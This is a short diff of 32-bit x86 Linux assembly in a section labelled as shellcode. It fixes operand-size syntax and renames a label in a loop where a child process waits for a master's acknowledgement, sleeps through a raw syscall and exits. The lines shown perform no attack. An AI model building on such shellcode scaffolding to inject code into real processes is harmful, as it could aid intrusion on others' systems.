@@ -37,25 +37,25 @@ shcode_start:
 
 child_dead:
 	; at most wait 2 seconds for master's ACK
-	cmp	[ebp+child_is_dead], 2
-	ja	leave
-	cmp	[ebp+child_is_dead_ACK], 0
-	jne	leave
+	cmp long [ebp+child_is_dead], 2
+	ja	leave_sh
+	cmp long [ebp+child_is_dead_ACK], 0
+	jne	leave_sh
 
-	inc	[ebp]
+	inc byte [ebp]
 
 	; usleep(1,0):
 	mov	eax, 162
 	mov	ebx, ebp
 	add	ebx, foo
 	mov	ecx, ebx
-	mov	[ebx], 1		; seconds
-	mov	[ebx+4], 0		; nanoseconds
+	mov long [ebx], 1		; seconds
+	mov long [ebx+4], 0		; nanoseconds
 	int	0x80
 
 	jmp	child_dead
 
-leave:
+leave_sh:
 	; exit
 	mov	eax,1
 	mov	ebx,0
